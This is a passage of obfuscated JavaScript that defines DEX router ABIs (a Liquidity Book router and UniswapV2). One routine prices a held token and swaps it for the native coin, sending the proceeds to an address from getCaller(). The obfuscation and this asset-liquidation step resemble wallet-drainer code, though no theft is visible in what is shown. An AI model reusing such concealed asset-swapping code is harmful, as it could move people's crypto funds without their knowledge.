          const _0xf2ebe8 = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: "uint256[]"
          };
          const _0x5bda1f = {
            internalType: "enum ILBRouter.Version[]",
            name: 'versions',
            type: "uint8[]"
          };
          const _0x4c1b18 = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x3b8d0e = {
            components: [_0xf2ebe8, _0x5bda1f, _0x4c1b18],
            internalType: "struct ILBRouter.Path",
            name: "path",
            type: "tuple"
          };
          const _0x563a9c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x41bf50 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3036ee = {
            internalType: "uint256",
            name: "amountOut",
            type: 'uint256'
          };
          const _0x4b42da = {
            inputs: [_0x55a449, _0x3b8d0e, _0x563a9c, _0x41bf50],
            name: "swapExactNATIVEForTokensSupportingFeeOnTransferTokens",
            outputs: [_0x3036ee],
            stateMutability: "payable",
            type: "function"
          };
          const _0x253af0 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x124f3b = {
            internalType: 'uint256',
            name: "amountOutMinNATIVE",
            type: 'uint256'
          };
          const _0x11ea42 = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x41987a = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x4ace7f = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: 'address[]'
          };
          const _0x6d2d90 = {
            components: [_0x11ea42, _0x41987a, _0x4ace7f],
            internalType: "struct ILBRouter.Path",
            name: 'path',
            type: "tuple"
          };
          const _0x2bc2d2 = {
            internalType: "address payable",
            name: 'to',
            type: "address"
          };
          const _0x2a8aac = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x38a77f = {
            inputs: [_0x253af0, _0x124f3b, _0x6d2d90, _0x2bc2d2, _0x2a8aac],
            name: "swapExactTokensForNATIVE",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x5ed4ff = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x52a4af = {
            internalType: 'uint256',
            name: "amountOutMinNATIVE",
            type: 'uint256'
          };
          const _0x6a409c = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x1c565a = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x4448bf = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x313fc5 = {
            components: [_0x6a409c, _0x1c565a, _0x4448bf],
            internalType: "struct ILBRouter.Path",
            name: 'path',
            type: 'tuple'
          };
          const _0x2edc3e = {
            internalType: "address payable",
            name: 'to',
            type: "address"
          };
          const _0x2db7f7 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x1965af = {
            inputs: [_0x5ed4ff, _0x52a4af, _0x313fc5, _0x2edc3e, _0x2db7f7],
            name: "swapExactTokensForNATIVESupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x55cd10 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x1cd10f = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x2d2f06 = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x337757 = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x54178b = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x13e359 = {
            components: [_0x2d2f06, _0x337757, _0x54178b],
            internalType: "struct ILBRouter.Path",
            name: "path",
            type: "tuple"
          };
          const _0x5a0705 = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x313fa8 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x2e039 = {
            inputs: [_0x55cd10, _0x1cd10f, _0x13e359, _0x5a0705, _0x313fa8],
            name: "swapExactTokensForTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x27537a = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x7bf1c2 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x1790c3 = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x5af70d = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x260098 = {
            internalType: "contract IERC20[]",
            name: 'tokenPath',
            type: "address[]"
          };
          const _0x3de45c = {
            components: [_0x1790c3, _0x5af70d, _0x260098],
            internalType: "struct ILBRouter.Path",
            name: 'path',
            type: "tuple"
          };
          const _0x7bbe81 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x26c451 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x526b1e = {
            inputs: [_0x27537a, _0x7bf1c2, _0x3de45c, _0x7bbe81, _0x26c451],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x153a10 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x306f73 = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x134e5a = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x1965b2 = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x427e59 = {
            components: [_0x306f73, _0x134e5a, _0x1965b2],
            internalType: "struct ILBRouter.Path",
            name: 'path',
            type: "tuple"
          };
          const _0x59a23c = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0x13d1e1 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x4ca099 = {
            inputs: [_0x153a10, _0x427e59, _0x59a23c, _0x13d1e1],
            name: "swapNATIVEForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amountsIn",
              'type': "uint256[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x6fb8fe = {
            internalType: 'uint256',
            name: "amountNATIVEOut",
            type: 'uint256'
          };
          const _0x15f9ba = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x275fab = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x4e33dd = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x970270 = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x5e4d93 = {
            components: [_0x275fab, _0x4e33dd, _0x970270],
            internalType: "struct ILBRouter.Path",
            name: 'path',
            type: "tuple"
          };
          const _0x457548 = {
            internalType: "address payable",
            name: 'to',
            type: "address"
          };
          const _0x45b6cf = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xf603b4 = {
            inputs: [_0x6fb8fe, _0x15f9ba, _0x5e4d93, _0x457548, _0x45b6cf],
            name: "swapTokensForExactNATIVE",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amountsIn",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x57ca87 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x37bf0e = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x2b8890 = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: 'uint256[]'
          };
          const _0x2d5a2c = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: 'uint8[]'
          };
          const _0x28bbbd = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x25f9f3 = {
            components: [_0x2b8890, _0x2d5a2c, _0x28bbbd],
            internalType: "struct ILBRouter.Path",
            name: "path",
            type: "tuple"
          };
          const _0x582ed3 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5688bd = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x24f707 = {
            inputs: [_0x57ca87, _0x37bf0e, _0x25f9f3, _0x582ed3, _0x5688bd],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amountsIn",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5c69fd = {
            internalType: "contract IERC20",
            name: 'token',
            type: "address"
          };
          const _0x1813ee = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1499dd = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x47614d = {
            inputs: [_0x5c69fd, _0x1813ee, _0x1499dd],
            name: 'sweep',
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x185b1d = {
            internalType: "contract ILBToken",
            name: "lbToken",
            type: 'address'
          };
          const _0x4f39be = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x30d4d2 = {
            internalType: 'uint256[]',
            name: "ids",
            type: 'uint256[]'
          };
          const _0x14043b = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1f525d = {
            inputs: [_0x185b1d, _0x4f39be, _0x30d4d2, _0x14043b],
            name: "sweepLBToken",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0xec38c3 = {
            stateMutability: "payable",
            type: "receive"
          };
          let _0x3d8b03 = [_0x4ed1f5, _0x1457fb, _0x3d6dd8, _0x2bca6d, _0x5040d9, _0x291bbb, _0x12fa25, _0x46671b, _0x27567e, _0x5c907b, _0x4bc742, _0x39d514, _0x59d0c5, _0x3d0f12, _0xdca6f5, _0xbe09c, _0x4781ec, _0x9b6d1a, _0x185e2b, _0x5edef0, _0x286217, _0x209791, _0x4513de, _0x4d63ed, _0x3c6b6a, _0x567b91, _0x3c1d5b, _0x73668a, _0x540716, _0x246d1a, _0x2ede4b, _0x3b77dd, _0x2b4f7e, _0x2a50bc, _0x55f2ef, _0x363bbd, _0x3cddf7, _0x57c4b6, _0x592764, _0xb01686, _0x4adebb, _0x529c28, _0x4bd611, _0x4b42da, _0x38a77f, _0x1965af, _0x2e039, _0x526b1e, _0x4ca099, _0xf603b4, _0x24f707, _0x47614d, _0x1f525d, _0xec38c3];
          let _0x22bd4a = new ethers.Contract(_0x3941f8, _0x3d8b03, _0xab3127);
          let _0x485acb = await _0x22bd4a.getWNATIVE();
          let _0xccc344 = [];
          _0xccc344[0] = _0x2a18aa.asset.token;
          _0xccc344[1] = _0x485acb;
          try {
            let _0x13d522 = this.token_array.find(_0x46f107 => _0x46f107.token_address == _0x2a18aa.asset.token && _0x46f107.chain == _0x2a18aa.chain);
            let _0x3eecc6 = this.token_array.find(_0x3a5afc => _0x3a5afc.token_address == "native" && _0x3a5afc.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x13d522.value) * Number(0.7) / Number(_0x3eecc6.price)).toString(), 'ether'));
          } catch {}
          return [_0x22bd4a.swapExactTokensForNATIVE(_0x2a18aa.asset.amount, _0xcd0737, [[0], [0], _0xccc344], this.getCaller(_0x2a18aa), _0x4d5eff), _0x485acb];
        }
      case 'UniswapV2':
        {
          const _0x4968f4 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x23967f = {
            internalType: "address",
            name: "_WETH",
            type: "address"
          };
          const _0x1a0da6 = {
            inputs: [_0x4968f4, _0x23967f],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x45d773 = {
            inputs: [],
            name: "WETH",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x210cb7 = {
            internalType: "address",
            name: 'tokenA',
            type: "address"
          };
          const _0x224f9c = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x124f49 = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x16462c = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x5861c6 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: "uint256"
          };
          const _0x4fb75d = {
            internalType: "uint256",
            name: "amountBMin",
            type: "uint256"
          };
          const _0x3231ca = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1e5a19 = {
            internalType: "uint256",
            name: "deadline",
            type: 'uint256'
          };
          const _0x2969be = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0xc67054 = {
            internalType: 'uint256',
            name: "amountB",
            type: "uint256"
          };
          const _0xa731ff = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x11c20e = {
            inputs: [_0x210cb7, _0x224f9c, _0x124f49, _0x16462c, _0x5861c6, _0x4fb75d, _0x3231ca, _0x1e5a19],
            name: "addLiquidity",
            outputs: [_0x2969be, _0xc67054, _0xa731ff],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3fe8a5 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x3b415f = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x22719b = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x35804c = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x5130aa = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x368903 = {
            internalType: "uint256",
            name: "deadline",
            type: "uint256"
          };
          const _0x332150 = {
            inputs: [_0x3fe8a5, _0x3b415f, _0x22719b, _0x35804c, _0x5130aa, _0x368903],
            name: "addLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "amountETH",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x46cfbd = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': 'address',
              'name': '',
              'type': "address"
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x446ce4 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x4189e0 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: "uint256"
          };
          const _0x17b2b3 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: "uint256"
          };
          const _0x3c4a1a = {
            inputs: [_0x446ce4, _0x4189e0, _0x17b2b3],
            name: "getAmountIn",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountIn',
              'type': "uint256"
            }],
            stateMutability: "pure",
            type: "function"
          };
          const _0x320330 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0xbd4a18 = {
            internalType: "uint256",
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x3c92c6 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x1184a9 = {
            inputs: [_0x320330, _0xbd4a18, _0x3c92c6],
            name: "getAmountOut",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x30f6fe = {
            internalType: 'uint256',
            name: "amountOut",
            type: 'uint256'
          };
          const _0x11d836 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x422403 = {
            inputs: [_0x30f6fe, _0x11d836],
            name: "getAmountsIn",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x45b27c = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x906095 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x75f3bf = {
            inputs: [_0x45b27c, _0x906095],
            name: "getAmountsOut",
            outputs: [{
              'internalType': "uint256[]",
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x4f2f5b = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x502bc4 = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x245cf5 = {
            internalType: 'uint256',
            name: 'reserveB',
            type: 'uint256'
          };
          const _0x3329ac = {
            inputs: [_0x4f2f5b, _0x502bc4, _0x245cf5],
            name: "quote",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountB",
              'type': "uint256"
            }],
            stateMutability: "pure",
            type: 'function'
          };
          const _0x4b7a71 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x203679 = {
            internalType: "address",
            name: 'tokenB',
            type: 'address'
          };
          const _0x4423bd = {
            internalType: "uint256",
            name: "liquidity",
            type: "uint256"
          };
          const _0x51fda6 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x43aadd = {
            internalType: "uint256",
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x7233b4 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2cf693 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x523001 = {
            inputs: [_0x4b7a71, _0x203679, _0x4423bd, _0x51fda6, _0x43aadd, _0x7233b4, _0x2cf693],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5dacfe = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x19f3da = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x357526 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x1e4e38 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x385a19 = {
            internalType: 'address',
            name: 'to',
            type: "address"
          };
          const _0xea2c9f = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5b71e8 = {
            inputs: [_0x5dacfe, _0x19f3da, _0x357526, _0x1e4e38, _0x385a19, _0xea2c9f],
            name: "removeLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x22414a = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x3baf4c = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x314f57 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2da56f = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x528ee8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5dc678 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x378da9 = {
            inputs: [_0x22414a, _0x3baf4c, _0x314f57, _0x2da56f, _0x528ee8, _0x5dc678],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2a1c77 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x73adc9 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0xc108fd = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2cd813 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: "uint256"
          };
          const _0x20156a = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x444bd7 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5ce15a = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x118a8e = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x21bf19 = {
            internalType: "bytes32",
            name: 'r',
            type: 'bytes32'
          };
          const _0x10f0e2 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x536dc5 = {
            inputs: [_0x2a1c77, _0x73adc9, _0xc108fd, _0x2cd813, _0x20156a, _0x444bd7, _0x5ce15a, _0x118a8e, _0x21bf19, _0x10f0e2],
            name: "removeLiquidityETHWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': 'amountETH',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x21adc1 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x507c1d = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x152a3b = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0xf85316 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x5eb8e1 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2bd685 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x52388a = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x4ae132 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x45ed2d = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x3bd6da = {
            internalType: "bytes32",
            name: 's',
            type: 'bytes32'
          };
          const _0x30bd79 = {
            inputs: [_0x21adc1, _0x507c1d, _0x152a3b, _0xf85316, _0x5eb8e1, _0x2bd685, _0x52388a, _0x4ae132, _0x45ed2d, _0x3bd6da],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0xca8d00 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x18a6be = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x2ff697 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x42329f = {
            internalType: 'uint256',
            name: "amountAMin",
            type: "uint256"
          };
          const _0x325266 = {
            internalType: "uint256",
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x275c29 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0xb09707 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x52ada3 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x4612dc = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x3ab628 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x5480ab = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x26824b = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x41524c = {
            internalType: "uint256",
            name: "amountB",
            type: "uint256"
          };
          const _0x17f1dc = {
            inputs: [_0xca8d00, _0x18a6be, _0x2ff697, _0x42329f, _0x325266, _0x275c29, _0xb09707, _0x52ada3, _0x4612dc, _0x3ab628, _0x5480ab],
            name: "removeLiquidityWithPermit",
            outputs: [_0x26824b, _0x41524c],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5b9497 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0x1fa5fb = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x2e592f = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x322aaf = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0xce4fd3 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x1e72e6 = {
            inputs: [_0x5b9497, _0x1fa5fb, _0x2e592f, _0x322aaf],
            name: "swapETHForExactTokens",
            outputs: [_0xce4fd3],
            stateMutability: "payable",
            type: "function"
          };
          const _0x17cc74 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x50f6b7 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x37bd03 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x13f6c6 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2a287a = {
            inputs: [_0x17cc74, _0x50f6b7, _0x37bd03, _0x13f6c6],
            name: "swapExactETHForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': 'amounts',
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5901b9 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x110c17 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x5313d5 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x31ce5b = {
            internalType: "uint256",
            name: "deadline",
            type: 'uint256'
          };
          const _0x40413e = {
            inputs: [_0x5901b9, _0x110c17, _0x5313d5, _0x31ce5b],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: 'function'
          };
          const _0x52bce5 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: "uint256"
          };
          const _0xca3056 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: "uint256"
          };
          const _0x3374e5 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x464add = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xf2e545 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xa63f16 = {
            internalType: "uint256[]",
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x38c579 = {
            inputs: [_0x52bce5, _0xca3056, _0x3374e5, _0x464add, _0xf2e545],
            name: "swapExactTokensForETH",
            outputs: [_0xa63f16],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x45f85e = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x299f6d = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x2406be = {
            internalType: 'address[]',
            name: 'path',
            type: "address[]"
          };
          const _0xf84692 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x50998d = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3e91f0 = {
            inputs: [_0x45f85e, _0x299f6d, _0x2406be, _0xf84692, _0x50998d],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4dc511 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x50c9c3 = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x503820 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x1f2e2d = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5e3017 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x1946ca = {
            internalType: "uint256[]",
            name: "amounts",
            type: "uint256[]"
          };
          const _0xcaa1bd = {
            inputs: [_0x4dc511, _0x50c9c3, _0x503820, _0x1f2e2d, _0x5e3017],
            name: "swapExactTokensForTokens",
            outputs: [_0x1946ca],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4e67d6 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x54ee7a = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x30c0e1 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x458589 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xc5be25 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x2cfc5a = {
            inputs: [_0x4e67d6, _0x54ee7a, _0x30c0e1, _0x458589, _0xc5be25],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x17ee87 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: "uint256"
          };
          const _0xe434f6 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x44a31e = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x34f99a = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x625e10 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4d711f = {
            inputs: [_0x17ee87, _0xe434f6, _0x44a31e, _0x34f99a, _0x625e10],
            name: "swapTokensForExactETH",
            outputs: [{
